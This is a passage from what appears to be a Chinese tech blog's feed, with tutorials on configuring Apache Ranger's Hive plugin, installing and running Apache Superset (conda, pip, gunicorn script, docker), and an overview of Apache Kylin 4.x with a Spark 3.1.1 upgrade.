Hive-plugin，在/opt/module/ranger/ranger-2.0.0-hive-plugin下执行以下命令</span></span><br><span class="line">./<span class="built_in">enable</span>-hive-plugin.sh</span><br><span class="line"><span class="comment"># 查看$HIVE_HOME/conf目录是否出现以下配置文件，如出现则表示Hive插件启用成功。</span></span><br><span class="line">ls <span class="variable">$HIVE_HOME</span>/conf | grep -E hiveserver2\|ranger</span><br><span class="line"><span class="comment"># 重启Hiveserver2，需使用hive用户启动</span></span><br><span class="line">sudo -i -u hive hiveserver2</span><br></pre></td></tr></table></figure><h3 id="2-3-在ranger-admin上配置hive插件">2.3 在ranger admin上配置hive插件</h3><p>谁启动hiveserver2谁设置为admin角色，我这里hive启动，将角色设置为Admin</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646031.png" alt></p><p>配置Hive插件，点击Access Manager，添加Hive Manager，配置服务详情</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Service Name：hive</span><br><span class="line">Username：rangerlookup</span><br><span class="line">Password：rangerlookup</span><br><span class="line">jdbc.driverClassName：org.apache.hive.jdbc.HiveDriver</span><br><span class="line">jdbc.url：jdbc:hive2://hadoop102:10000/;principal=hive/hadoop102@EXAMPLE.COM</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202404161646032.png" alt></p><p>先进行add，如何在编辑进行测试，可以发现成功连接了</p><h2 id="3、使用Ranger对Hive进行权限管理">3、使用Ranger对Hive进行权限管理</h2><h3 id="3-1-权限控制初体验">3.1 权限控制初体验</h3><p>查看默认的访问策略，此时只有rangerlookup用户拥有对所有库、表和函数的访问权限，故理论上其余用户是不能访问任何Hive资源的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证：使用atguigu用户尝试进行认证，认证成功后，使用beeline客户端连接Hiveserver2</span></span><br><span class="line"><span class="comment"># 首先进行认证</span></span><br><span class="line">kinit atguigu</span><br><span class="line">beeline -u <span class="string">"jdbc:hive2://hadoop102:10000/;principal=hive/hadoop102@EXAMPLE.COM"</span></span><br><span class="line"><span class="comment"># 执行以下sql语句，验证当前用户为atguigu</span></span><br><span class="line">select current_user();</span><br><span class="line"><span class="comment"># 执行use gmall语句，结果atguigu用户没有对gmall库的使用权限</span></span><br><span class="line">use gmall;</span><br><span class="line"><span class="comment"># 赋予atguigu用户对gmall数据库的访问权限</span></span><br><span class="line"><span class="comment"># 点击hive-&gt;点击Add New Policy</span></span><br><span class="line"><span class="comment"># 配置授权策略,将gmall库的所有表的所有权限均授予给了atguigu用户</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202404161646033.png" alt></p><p>等待片刻，在回到beeline客户端，重新执行use gmall语句，此时atguigu用户已经能够使用gmall库，并且可访问gmall库下的所有表了</p><h3 id="3-2-Ranger授权模型">3.2 Ranger授权模型</h3><p>Ranger所采用的权限管理模型可归类为RBAC（Role-Based Access Control ）基于角色的访问控制。基础的RBAC模型共包含三个实体，分别是用户（user）、角色（role）和权限（permission）。用户需划分为某个角色，权限的授予对象也是角色，例如用户张三为管理角色，那他就拥有了管理员角色的所有权限。</p><p>Ranger的权限管理模型比基础的RBAC模型要更加灵活，以下是Ranger的权限管理模型。</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646034.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;权限管理Ranger详解&lt;/h1&gt;
&lt;h1&gt;一、Ranger概述与安装&lt;/h1&gt;
&lt;h2 id=&quot;1、Ranger概述&quot;&gt;1、Ranger概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-Ranger介绍&quot;&gt;1.1 Ranger介绍&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Ranger的官网：&lt;a href=&quot;https://ranger.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://ranger.apache.org/&quot;&gt;https://ranger.apache.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Apache Ranger是一个Hadoop平台上的全方位数据安全管理框架，它可以为整个Hadoop生态系统提供全面的安全管理。&lt;/p&gt;
&lt;p&gt;随着企业业务的拓展，企业可能在多用户环境中运行多个工作任务，这就需要一个可以对安全策略进行集中管理，配置和监控用户访问的框架。Ranger由此产生&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>可视化报表Superset</title>
    <link href="https://blog.shawncoding.top/posts/10ce08f8.html"/>
    <id>https://blog.shawncoding.top/posts/10ce08f8.html</id>
    <published>2024-05-31T08:23:25.000Z</published>
    <updated>2024-05-31T08:28:08.725Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Superset入门与安装</h1><h2 id="1、Superset概述">1、Superset概述</h2><blockquote><p>Superset官网地址：<a href="http://superset.apache.org/" target="_blank" rel="noopener" title="http://superset.apache.org/">http://superset.apache.org/</a></p></blockquote><p>Apache Superset是一个现代的数据探索和可视化平台。它功能强大且十分易用，可对接各种数据源，包括很多现代的大数据分析引擎，拥有丰富的图表展示形式，并且支持自定义仪表盘</p><a id="more"></a><h2 id="2、安装Python环境">2、安装Python环境</h2><h3 id="2-1-安装Miniconda">2.1 安装Miniconda</h3><p>Superset是由Python语言编写的Web应用，要求Python3.7的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">bash Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"><span class="comment"># 将路径放到/opt/module/miniconda3下</span></span><br><span class="line"><span class="comment"># 成功后重启shell</span></span><br><span class="line"><span class="comment"># 查看python版本</span></span><br><span class="line">python -V</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载环境变量配置文件，使之生效也可以</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line"><span class="comment"># 取消激活base环境</span></span><br><span class="line"><span class="comment"># Miniconda安装完成后，每次打开终端都会激活其默认的base环境，我们可通过以下命令，禁止激活默认base环境</span></span><br><span class="line">conda config --<span class="built_in">set</span> auto_activate_base <span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="2-2-创建Python3-7环境">2.2 创建Python3.7环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置conda国内镜像</span></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Python3.7环境</span></span><br><span class="line">conda activate</span><br><span class="line">conda create --name superset python=3.7</span><br><span class="line">conda activate superset</span><br><span class="line"><span class="comment"># 退出当前环境</span></span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure><h2 id="3、Superset部署">3、Superset部署</h2><blockquote><p><a href="https://superset.apache.org/docs/installation/installing-superset-from-scratch" target="_blank" rel="noopener" title="https://superset.apache.org/docs/installation/installing-superset-from-scratch">https://superset.apache.org/docs/installation/installing-superset-from-scratch</a></p></blockquote><p>docker安装更方便，这里演示二进制包安装</p><h3 id="3-1-安装Superset">3.1 安装Superset</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装Superset之前，需安装以下所需依赖</span></span><br><span class="line">sudo yum install -y gcc gcc-c++ libffi-devel python-devel python-pip python-wheel python-setuptools openssl-devel cyrus-sasl-devel openldap-devel</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Superset</span></span><br><span class="line"><span class="comment"># 安装（更新）setuptools和pip</span></span><br><span class="line">pip install --upgrade setuptools pip -i https://pypi.douban.com/simple/</span><br><span class="line"><span class="comment"># 安装Supetset</span></span><br><span class="line"><span class="comment"># -i的作用是指定镜像，这里选择国内镜像</span></span><br><span class="line">pip install apache-superset -i https://pypi.douban.com/simple/</span><br><span class="line"><span class="comment"># 如果遇到网络错误导致不能下载，可尝试更换镜</span></span><br><span class="line">pip install apache-superset --trusted-host https://repo.huaweicloud.com -i https://repo.huaweicloud.com/repository/pypi/simple</span><br><span class="line"><span class="comment"># 初始化Supetset数据库</span></span><br><span class="line">superset db upgrade</span><br><span class="line"><span class="comment"># 一些常见错误可以参考：https://blog.csdn.net/zgzdqq/article/details/127996901</span></span><br><span class="line"><span class="comment"># 这里花了好久，反正就是缺啥补啥，都是版本依赖问题</span></span><br><span class="line"><span class="comment"># markupsafe依赖的版本回退到 2.0.1(报错ImportError: cannot import name 'soft_unicode' from 'markupsafe回退)</span></span><br><span class="line"><span class="comment"># pip install --force-reinstall MarkupSafe==2.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建管理员用户</span></span><br><span class="line"><span class="comment"># 说明：flask是一个python web框架，Superset使用的就是flask</span></span><br><span class="line"><span class="built_in">export</span> FLASK_APP=superset</span><br><span class="line">superset fab create-admin</span><br><span class="line"><span class="comment"># Superset初始化</span></span><br><span class="line">superset init</span><br></pre></td></tr></table></figure><h3 id="3-2-启动Supterset">3.2 启动Supterset</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gunicorn是一个Python Web Server，可以和java中的TomCat类比</span></span><br><span class="line">pip install gunicorn -i https://pypi.douban.com/simple/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Superset,确保当前conda环境为superset</span></span><br><span class="line">gunicorn --workers 5 --timeout 120 --<span class="built_in">bind</span> hadoop102:8787  <span class="string">"superset.app:create_app()"</span> --daemon </span><br><span class="line"><span class="comment"># workers：指定进程个数</span></span><br><span class="line"><span class="comment"># timeout：worker进程超时时间，超时会自动重启</span></span><br><span class="line"><span class="comment"># bind：绑定本机地址，即为Superset访问地址</span></span><br><span class="line"><span class="comment"># daemon：后台运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录Superset</span></span><br><span class="line"><span class="comment"># 访问http://hadoop102:8787</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止superset</span></span><br><span class="line">ps -ef | awk <span class="string">'/superset/ &amp;&amp; !/awk/&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure><h3 id="3-3-superset启停脚本">3.3 superset启停脚本</h3><p>vim <a href="http://superset.sh" target="_blank" rel="noopener">superset.sh</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">superset_status</span></span>()&#123;</span><br><span class="line">    result=`ps -ef | awk <span class="string">'/gunicorn/ &amp;&amp; !/awk/&#123;print $2&#125;'</span> | wc -l`</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$result</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">return</span> 0</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">superset_start</span></span>()&#123;</span><br><span class="line">        <span class="built_in">source</span> ~/.bashrc</span><br><span class="line">        superset_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">        <span class="keyword">if</span> [[ $? -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">            conda activate superset ; gunicorn --workers 5 --timeout 120 --<span class="built_in">bind</span> hadoop102:8787 --daemon <span class="string">'superset.app:create_app()'</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"superset正在运行"</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">superset_stop</span></span>()&#123;</span><br><span class="line">    superset_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [[ $? -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"superset未在运行"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ps -ef | awk <span class="string">'/gunicorn/ &amp;&amp; !/awk/&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    start )</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"启动Superset"</span></span><br><span class="line">        superset_start</span><br><span class="line">    ;;</span><br><span class="line">    stop )</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"停止Superset"</span></span><br><span class="line">        superset_stop</span><br><span class="line">    ;;</span><br><span class="line">    restart )</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"重启Superset"</span></span><br><span class="line">        superset_stop</span><br><span class="line">        superset_start</span><br><span class="line">    ;;</span><br><span class="line">    status )</span><br><span class="line">        superset_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">        <span class="keyword">if</span> [[ $? -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"superset未在运行"</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"superset正在运行"</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>加执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x superset.sh</span><br><span class="line">superset.sh start</span><br></pre></td></tr></table></figure><h2 id="4、docker部署">4、docker部署</h2><blockquote><p>其他可以参考官网：<a href="https://superset.apache.org/docs/installation/installing-superset-using-docker-compose" target="_blank" rel="noopener" title="https://superset.apache.org/docs/installation/installing-superset-using-docker-compose">https://superset.apache.org/docs/installation/installing-superset-using-docker-compose</a></p></blockquote><p>首先安装好docker依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">docker pull amancevice/superset</span><br><span class="line"><span class="comment"># 创建存储superset数据配置所需文件夹</span></span><br><span class="line">mkdir -p /opt/module/superset/conf </span><br><span class="line">mkdir -p /opt/module/superset/data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行superset容器</span></span><br><span class="line">docker run --name superset -u 0 -d -p 17077:8088 \</span><br><span class="line">-v /opt/module/superset/conf:/etc/superset \</span><br><span class="line">-v /opt/module/superset/data:/var/lib/superset amancevice/superset:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化superset数据库</span></span><br><span class="line">docker <span class="built_in">exec</span> -it superset superset db upgrade</span><br><span class="line"><span class="comment"># 创建superset管理员用户</span></span><br><span class="line">docker <span class="built_in">exec</span> -it superset superset fab create-admin</span><br><span class="line"><span class="comment"># 初始化superset</span></span><br><span class="line">docker <span class="built_in">exec</span> -it superset superset init </span><br><span class="line"><span class="comment"># 开启服务</span></span><br><span class="line">docker <span class="built_in">exec</span> -it superset superset run --with-threads --reload --debugger</span><br><span class="line"><span class="comment"># 浏览器地址栏输入 IP:17077/login</span></span><br></pre></td></tr></table></figure><h1>二、Superset使用与实战</h1><h2 id="1、对接MySQL数据源">1、对接MySQL数据源</h2><blockquote><p>对接不同的数据源，需安装不同的依赖，以下地址为官网说明：<a href="https://superset.apache.org/docs/databases/installing-database-drivers" target="_blank" rel="noopener" title="https://superset.apache.org/docs/databases/installing-database-drivers">https://superset.apache.org/docs/databases/installing-database-drivers</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda install mysqlclient</span><br><span class="line">superset.sh restart</span><br></pre></td></tr></table></figure><p>然后配置<a href="https://superset.apache.org/docs/creating-charts-dashboards/creating-your-first-dashboard" target="_blank" rel="noopener" title="数据源配置">数据源配置</a>，配置数据源，然后导入dataset</p><h2 id="2、制作仪表盘与图表">2、制作仪表盘与图表</h2><p>点击Dashboards/+DASHBOARDS制作空白仪表盘；然后创建图表，点击Charts/+CHART，选则数据源及图表类型，下面是一些图配置，具体的操作详见官网</p><p>制作地图，报表为ads_order_count_by_province</p><p><img src="http://qnypic.shawncoding.top/blog/202404151824095.png" alt></p><p>制作饼状图，报表为ads_order_count_by_category</p><p><img src="http://qnypic.shawncoding.top/blog/202404151824097.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Superset入门与安装&lt;/h1&gt;
&lt;h2 id=&quot;1、Superset概述&quot;&gt;1、Superset概述&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Superset官网地址：&lt;a href=&quot;http://superset.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;http://superset.apache.org/&quot;&gt;http://superset.apache.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Apache Superset是一个现代的数据探索和可视化平台。它功能强大且十分易用，可对接各种数据源，包括很多现代的大数据分析引擎，拥有丰富的图表展示形式，并且支持自定义仪表盘&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>即席查询</title>
    <link href="https://blog.shawncoding.top/posts/7ed103be.html"/>
    <id>https://blog.shawncoding.top/posts/7ed103be.html</id>
    <published>2024-05-31T08:23:18.000Z</published>
    <updated>2024-05-31T08:35:34.463Z</updated>
    
    <content type="html"><![CDATA[<h1>即席查询</h1><h1>一、Kylin4.x</h1><h2 id="1、Kylin概述">1、Kylin概述</h2><h3 id="1-1-定义">1.1 定义</h3><p>Apache Kylin 是一个开源的分布式分析引擎，提供 Hadoop/Spark 之上的 SQL 查询接口及多维分析（OLAP）能力以支持超大规模数据，最初由 eBay Inc 开发并贡献至开源社区。它能在亚秒内查询巨大的 Hive 表。</p><a id="more"></a><p>OLAP（online analytical processing）是一种软件技术，它使分析人员能够迅速、一致、交互地从各个方面观察信息，以达到深入理解数据的目的。从各方面观察信息，也就是从不同的维度分析数据，因此OLAP也成为多维分析。也包括ROLAP(Relational OLAP)和MOLAP(Multidimensional OLAP)，前者基于关系型数据库，不需要预计算；后者基于多维数据集，需要预计算</p><p><img src="http://qnypic.shawncoding.top/blog/202404151825587.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202404151825588.png" alt></p><h3 id="1-2-Kylin-架构">1.2 Kylin 架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151825589.png" alt></p><ul><li><strong>REST Server</strong></li></ul><p>REST Server 是一套面向应用程序开发的入口点，旨在实现针对 Kylin 平台的应用开发工作。 此类应用程序可以提供查询、获取结果、触发 cube 构建任务、获取元数据以及获取用户权限等等。另外可以通过Restful 接口实现 SQL 查询。</p><ul><li><strong>查询引擎（Query Engine）</strong></li></ul><p>当 cube 准备就绪后，查询引擎就能够获取并解析用户查询。它随后会与系统中的其它组件进行交互，从而向用户返回对应的结果。 Kylin4.0 将 Spark 作为查询引擎。</p><ul><li><strong>路由层（Routing）</strong></li></ul><p>在最初设计时曾考虑过将 Kylin 不能执行的查询引导去 Hive 中继续执行，但在实践后发现 Hive 与 Kylin 的速度差异过大，导致用户无法对查询的速度有一致的期望，很可能大多数查询几秒内就返回结果了，而有些查询则要等几分钟到几十分钟，因此体验非常糟糕。最后这个路由功能在发行版中默认关闭。</p><ul><li><strong>元数据管理工具（Metadata）</strong></li></ul><p>Kylin 是一款元数据驱动型应用程序。元数据管理工具是一大关键性组件，用于对保存在 Kylin 当中的所有元数据进行管理，其中包括最为重要的 cube 元数据。其它全部组件的正常运作都需以元数据管理工具为基础。 Kylin4.0 的元数据存储在 MySQL 中</p><ul><li><strong>任务构建引擎（Cube Build Engine）</strong></li></ul><p>kylin4.0 的构建引擎从 MR 替换为 Spark，速度更快。使用户能够快速得到想要的 Cube数据。构建引擎最终得到的数据存放到 Parquet 文件当中，然后让用户可以更好的使用SparkSQL 查询引擎去读取 Cube 数据</p><h3 id="1-3-Kylin-特点">1.3 Kylin 特点</h3><p>Kylin 的主要特点包括支持 SQL 接口、支持超大规模数据集、亚秒级响应、可伸缩性、高吞吐率、BI 工具集成等</p><ul><li><strong>标准 SQL 接口</strong>：Kylin 是以标准的 SQL 作为对外服务的接口</li><li><strong>支持超大数据集</strong>：Kylin 对于大数据的支撑能力可能是目前所有技术中最为领先的。早在 2015 年 eBay 的生产环境中就能支持百亿记录的秒级查询，之后在移动的应用场景中又有了千亿记录秒级查询的案例</li><li><strong>亚秒级响应</strong>：Kylin 拥有优异的查询相应速度，这点得益于预计算，很多复杂的计算，比如连接、聚合，在离线的预计算过程中就已经完成，这大大降低了查询时刻所需的计算量，提高了响应速度</li><li><strong>可伸缩性和高吞吐率</strong>：单节点 Kylin 可实现每秒 70 个查询，还可以结合 Zookeeper分布式协调服务搭建 Kylin 集群，速度更快</li><li><strong>BI 工具集成</strong>，Kylin 可以与现有的 BI 工具集成，具体包括如下内容<ul><li>ODBC：与 Tableau、Excel、PowerBI 等工具集成</li><li>JDBC：与 Saiku、BIRT 等 Java 工具集成</li><li>RestAPI：与 JavaScript、Web 网页集成</li></ul></li></ul><p>Kylin 开发团队还贡献了 **Zepplin **的插件，也可以使用 Zepplin 来访问 Kylin 服务</p><h3 id="1-4-Kylin4-0-升级">1.4 Kylin4.0 升级</h3><p>Apache Kylin4.0 是 Apache Kylin3.x 之后一次重大的版本更新，它采用了全新的 Spark构建引擎和Parquet 作为存储，同时使用 Spark 作为查询引擎。首先介绍一下 Apache Kylin 4.0 的主要优势，Apache Kylin 4 是完全基于 Spark 去做构建和查询的，能够充分地利用 Spark 的并行化、向量化和全局动态代码生成等技术，去提高大数据场景下查询的效率。</p><ul><li><strong>数据存储</strong></li></ul><p>Apache Kylin 3.0 是使用 Hbase 作为存储结构的，因此我们可以称为是 Kylin on Hbase。而 Apache Kylin 4.0 完全砍掉了 Hbase，底层使用 Parquet 存储文件，因此可以称为 Kylin onParquet。首先来看一下，Kylin on HBase 和 Kylin on Parquet 的对比。Kylin on HBase 的 Cuboid的数据是存放在 HBase 的表里，一个 Segment 对应了一张 HBase 表，查询下压的工作由HBase 协理器处理，因为 HBase 不是真正的列存并且对 OLAP 而言吞吐量不高。Kylin 4将 HBase 替换为 Parquet，也就是把所有的数据按照文件存储，每个 Segment 会存在一个对应的 HDFS 的目录，所有的查询、构建都是直接通过读写文件的方式，不用再经过 HBase。虽然对于小查询的性能会有一定损失，但对于复杂查询带来的提升是更可观的、更值得的。</p><ul><li><strong>构建引擎</strong></li></ul><p>Kylin Cube 的构建引擎，在 Kylin3.0 中，一般都会使用 MR 作为 Cube 构建引擎去逐层构建 Cube，速度较慢。而在 Kylin4.0 中，将构建引擎换成了特定优化的 Spark 引擎，步骤也减少为了两大步，第一步进行资源探测，收集构建 Cube 所需要的元数据信息。第二步使用 Spark 引擎去计算和构建，有效的提升了 Cube 构建速度</p><ul><li><strong>查询引擎</strong></li></ul><p>Kylin3.0 的查询完全依托于 Calcite 引擎和 HBase 的协处理器，这就导致当数据从HBase 读取后，如果想做聚合、排序等，就会局限于 QueryServer 单点的瓶颈，而 Kylin4 则转换为基于 Spark SQL 的 DataFrame 作为查询引擎，得益于 Spark 的分布式查询机制，Kylin4.0 的查询速度也有了不少的改善</p><h2 id="2、Kylin-环境搭建">2、Kylin 环境搭建</h2><blockquote><p>官网：<a href="https://kylin.apache.org/docs/" target="_blank" rel="noopener" title="https://kylin.apache.org/docs/">https://kylin.apache.org/docs/</a></p></blockquote><h3 id="2-1-简介">2.1 简介</h3><p>安装 Kylin 前需先部署好 Hadoop、Hive、Zookeeper、Spark，并且需要在/etc/profile 中配置以下环境变量 <code>HADOOP_HOME，HIVE_HOME，ZOOKEEPER_HOME，SPARK_HOME</code>记得 source 使其生效。</p><p>注意：目前集群中 hadoop3.1.3 和 hive3.1.2 是可以满足 Kylin4.0 安装和使用的，但是经测试 Spark3.0.0 不能满足 Kylin4.0 对 Spark3 最低版本的要求，因此我们需要先升级 Spark 的版本为 3.1.1</p><h3 id="2-2-Spark-安装和部署">2.2 Spark 安装和部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载新版本</span></span><br><span class="line">wget https://archive.apache.org/dist/spark/spark-3.1.1/spark-3.1.1-bin-hadoop3.2.tgz</span><br><span class="line"><span class="comment"># 解压 spark-3.1.1-bin-hadoop3.2.tgz 到/opt/module</span></span><br><span class="line">tar -zxvf spark-3.1.1-bin-hadoop3.2.tgz -C /opt/module/</span><br><span class="line">mv /opt/module/spark-3.1.1-bin-hadoop3.2/ /opt/module/spark-3.1.1</span><br><span class="line"><span class="comment"># 设置 SPARK_HOME，然后 source 使其生效</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment">#SPARK_HOME</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HOME=/opt/module/spark-3.1.1</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$SPARK_HOME</span>/bin</span><br><span class="line"><span class="comment"># 刷一下</span></span><br><span class="line"><span 